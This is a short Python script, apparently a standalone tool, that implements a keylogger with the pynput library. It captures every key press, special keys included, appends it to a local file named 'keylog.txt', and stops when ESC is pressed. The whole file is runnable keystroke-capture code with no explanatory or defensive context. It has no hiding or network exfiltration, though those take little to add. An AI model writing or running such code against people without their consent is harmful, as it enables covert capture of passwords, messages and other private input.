from pynput import keyboard

# Define the log file
log_file = "keylog.txt"

def on_press(key):
    """Callback function to handle key press events."""
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as f:
            f.write(f"[{key}]")
    except Exception as e:
        print(f"Error logging key: {e}")

def on_release(key):
    """Callback function to handle key release events."""
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def start_keylogger():
    """Start the keylogger."""
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Starting keylogger. Press ESC to stop.")
    start_keylogger()

